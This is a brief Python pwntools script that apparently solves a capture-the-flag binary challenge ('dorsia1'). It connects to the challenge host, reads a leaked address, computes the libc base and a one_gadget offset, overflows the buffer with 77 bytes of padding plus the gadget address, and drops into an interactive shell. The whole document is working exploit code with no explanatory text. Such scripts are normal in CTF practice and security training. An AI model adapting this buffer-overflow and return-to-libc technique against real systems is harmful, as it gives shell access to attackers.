from pwn import *

p = remote('dorsia1.wpictf.xyz', 31339)
e = ELF('./libc.so.6')

# Leak addresses
leak = int(p.recvline(), 16)
system = leak - 765772
libc = system - e.sym['__libc_system']
one_gadget = libc + 0x4f322
padding = b'A' * 77

# Info
print('Libc: ', hex(libc))
print('System: ', hex(system))

# Send the one_gadget and get flag ez
p.sendline(padding + p64(one_gadget))
p.interactive()
